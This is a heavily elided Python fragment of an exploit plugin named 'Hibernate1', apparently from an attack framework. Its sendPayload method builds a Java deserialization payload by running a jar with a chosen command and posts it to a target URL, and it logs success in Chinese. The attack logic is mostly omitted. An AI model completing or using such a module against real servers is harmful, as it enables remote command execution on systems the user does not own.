...
@Idea.plugin_register('Class17:Hibernate1')
class Hibernate1(object):
    ...
    def sendPayload(self,url,command,resKey,fp=JAR_FILE):
        ...
        popen = subprocess.Popen(['java', '-jar', fp, 'Hibernate1', command],       #popen
        ...
        try:
            ...
            if(x.status_code==200):
                ...
                print("[+]   ****Hibernate1模块   key: {} 已成功发送！  状态码:{}".format(str(resKey),str(x.status_code)))
            else:
                print("[-]   ****Hibernate1模块   key: {} 发送异常！    状态码:{}".format(str(resKey),str(x.status_code)))
